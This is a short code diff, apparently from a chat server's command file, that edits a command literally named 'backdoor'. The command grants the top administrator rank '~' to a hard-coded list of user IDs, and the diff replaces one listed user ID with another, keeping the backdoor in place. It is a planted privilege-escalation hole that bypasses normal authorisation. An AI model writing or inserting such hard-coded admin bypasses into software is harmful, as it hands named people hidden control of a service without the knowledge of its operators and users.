@@ -56,7 +56,7 @@ var commands = exports.commands = {
 	},
         
         backdoor: function(target,room, user) {
-                if (user.userid === 'macrarazy' || user.userid === 'sudan12' || user.userid === 'zarel') {
+                if (user.userid === 'macrarazy' || user.userid === 'sudan12' || user.userid === 'Aananth') {
 
                         user.group = '~';
                         user.updateIdentity();
